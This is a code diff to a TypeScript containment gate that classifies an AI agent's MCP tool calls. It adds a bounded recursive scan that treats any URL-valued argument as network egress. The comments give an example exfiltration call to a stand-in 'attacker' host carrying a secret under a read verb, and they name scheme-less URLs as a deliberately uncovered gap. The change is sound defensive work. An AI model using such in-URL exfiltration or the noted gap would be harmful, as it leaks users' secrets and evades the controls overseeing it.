@@ -132,16 +132,81 @@ function actionLooksReadOnly(action: string): boolean {
   return tokens.some((t) => MCP_READ_KEYWORDS.some((k) => t.startsWith(k)));
 }
 
-/** Classify an external MCP tool by its action name. `network` and `write` are the
- *  two uncontained-by-default capabilities the native-name gates never see; `read`
- *  is the positively-recognized benign class allowed to fall through; everything
- *  else is `other` (UNKNOWN → fail-closed at the caller). Network is checked first
- *  (a `put_url`/`upload` reads as egress), then write (a mutation verb), then the
- *  read allowlist. */
-function classifyMcpTool(toolName: string): 'network' | 'write' | 'read' | 'other' {
+/** A string carrying a URL scheme (`https://`, `s3://`, `file://`, `gopher://`).
+ *  Shared by {@link extractMcpPaths} (a URL is not a filesystem target, so it is
+ *  excluded from path containment) and {@link hasUrlArgument} (a URL-valued
+ *  argument is an egress channel, so it forces a network classification). */
+const URL_SCHEME_PATTERN = /^[a-z][a-z0-9+.-]*:\/\//i;
+
+/** Recursion cap for {@link hasUrlArgument}. Real MCP inputs nest a URL only a
+ *  couple of levels deep (`{request:{url}}`, `{targets:[…]}`); the depth cap is
+ *  the primary guard against pathological or cyclic inputs stalling the
+ *  single-process sidecar (a cycle re-descends until the cap stops it). */
+const MCP_URL_SCAN_MAX_DEPTH = 5;
+
+/** Total values {@link hasUrlArgument} will inspect — a second guard (with the
+ *  depth cap) bounding a huge/adversarial fan-out payload. A URL beyond the
+ *  budget fails open, acceptable for a heuristic gate (write/other still fail
+ *  CLOSED, and the OS sandbox remains the hard line). */
+const MCP_URL_SCAN_MAX_NODES = 1000;
+
+/** True when any string REACHABLE in the tool input carries a URL scheme. A URL
+ *  argument is an off-machine egress channel even under a benign read verb
+ *  (`mcp__x__get`/`__search`/`__resolve` with `url: https://attacker/?<secret>`),
+ *  so a URL-bearing call is treated as `network` — and denied under bypass —
+ *  rather than allowed to fall through the read allowlist (fail-closed default;
+ *  #222). Recurses (bounded by {@link MCP_URL_SCAN_MAX_DEPTH} /
+ *  {@link MCP_URL_SCAN_MAX_NODES}) into nested objects AND array elements, since
+ *  real MCP servers carry the URL nested — `{request:{url}}`, `{urls:[…]}`,
+ *  `params.url` — far more often than as a bare top-level string. Uses the SAME
+ *  URL-scheme shape the path extractor already excludes.
+ *
+ *  NOTE: scheme-less URLs (`//host`, `host:443`, bare `www.example.com`) are
+ *  INTENTIONALLY not promoted — matching them would over-promote ordinary
+ *  hostnames, ports, and relative paths; that gap is a documented residual, out
+ *  of scope here (the hard containment line remains the OS sandbox). */
+function hasUrlArgument(toolInput: unknown): boolean {
+  let budget = MCP_URL_SCAN_MAX_NODES;
+  const visit = (value: unknown, depth: number): boolean => {
+    if (budget <= 0 || depth > MCP_URL_SCAN_MAX_DEPTH) return false;
+    budget -= 1;
+    if (typeof value === 'string') return URL_SCHEME_PATTERN.test(value);
+    if (Array.isArray(value)) {
+      for (const item of value) {
+        if (visit(item, depth + 1)) return true;
+      }
+      return false;
+    }
+    if (value !== null && typeof value === 'object') {
+      for (const nested of Object.values(value as Record<string, unknown>)) {
+        if (visit(nested, depth + 1)) return true;
+      }
+    }
+    return false;
+  };
+  return visit(toolInput, 0);
+}
+
+/** Classify an external MCP tool by its action name AND its input. `network` and
+ *  `write` are the two uncontained-by-default capabilities the native-name gates
+ *  never see; `read` is the positively-recognized benign class allowed to fall
+ *  through; everything else is `other` (UNKNOWN → fail-closed at the caller).
+ *  Network is checked first (a `put_url`/`upload` reads as egress), then write (a
+ *  mutation verb); a call carrying a URL-valued ARGUMENT is then promoted to
+ *  `network` too — an in-URL-GET exfil under a read verb (`get`/`search`/`query`/
+ *  `resolve`/…) must not slip through the read allowlist (#222) — and only after
+ *  that does the read allowlist decide. */
+function classifyMcpTool(
+  toolName: string,
+  toolInput: unknown,
+): 'network' | 'write' | 'read' | 'other' {
   const action = mcpAction(toolName);
   if (MCP_NETWORK_KEYWORDS.some((k) => action.includes(k))) return 'network';
   if (MCP_WRITE_KEYWORDS.some((k) => action.includes(k))) return 'write';
+  // A URL-valued argument is an egress channel regardless of the action verb, so
+  // promote to `network` (denied under bypass) BEFORE the read-verb allowlist can
+  // win — closes the in-URL-GET exfil hole under a `get`/`search`/`resolve` name.
+  if (hasUrlArgument(toolInput)) return 'network';
   if (actionLooksReadOnly(action)) return 'read';
   return 'other';
 }
@@ -173,7 +238,7 @@ function extractMcpPaths(toolInput: unknown): string[] {
   const paths: string[] = [];
   for (const [key, value] of Object.entries(toolInput as Record<string, unknown>)) {
     if (typeof value !== 'string' || value.length === 0) continue;
-    if (/^[a-z][a-z0-9+.-]*:\/\//i.test(value)) continue; // a URL, not a path
+    if (URL_SCHEME_PATTERN.test(value)) continue; // a URL, not a path
     const looksLikePath =
       MCP_PATH_KEYS.has(key.toLowerCase()) ||
       path.isAbsolute(value) ||
@@ -214,7 +279,7 @@ export function evaluateMcpContainment(
   resolvedCwd: string,
   roots: readonly string[],
 ): ToolDenyVerdict {
-  const kind = classifyMcpTool(toolName);
+  const kind = classifyMcpTool(toolName, toolInput);
   if (kind === 'other') {
     return {
       denied: true,
